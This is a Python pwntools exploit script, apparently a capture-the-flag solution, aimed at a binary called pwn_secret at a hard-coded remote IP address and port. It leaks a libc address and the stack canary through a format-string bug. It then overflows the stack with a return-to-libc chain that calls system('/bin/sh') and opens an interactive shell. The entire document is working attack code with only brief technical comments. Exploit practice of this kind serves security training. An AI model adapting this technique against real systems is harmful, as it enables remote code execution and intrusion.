from pwn import *

HOST, PORT = '206.81.24.129', 1339
BINARY = './pwn_secret'

elf = ELF(BINARY)
libc = ELF('./libc-2.23.so') # libc.so.6 from Ubuntu Xenial

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()

# canary offset is 136 bytes, index 15
# libc offset 0x3c6780 for address index 2
p.sendlineafter(': ', '0x%2$lx-0x%15$lx') # Leak libc address (idx 2) and the canary (idx 15)
leaks = p.recvline().split('-')

libc.address = int(leaks[0].split(' ')[1], 16) - 0x3c6780
canary = int(leaks[1], 16)
one_gadget = 0xf1147 # 0x45216, 0x4526a, 0xf02a4 <- none of the gadgets worked
system = libc.symbols['system']
bin_sh = libc.search('/bin/sh').next()
pop_rdi = libc.address + 0x21102 # found using ROPgadget on libc-2.23.so

log.info('libc base: ' + hex(libc.address))
log.info('canary: ' + hex(canary))
log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))
log.info('pop rdi: ' + hex(pop_rdi))

payload = 'A'*136 # Write upto canary
payload += p64(canary) # Write the canary so we can smash the stack without it complaining
payload += 'B'*8 # Overwrite ebp
payload += p64(pop_rdi) # Jump to pop rdi gadget
payload += p64(bin_sh) # Put address of '/bin/sh' string into rdi
payload += p64(system) # call system("/bin/sh")

p.sendlineafter(': ', payload)

p.interactive()
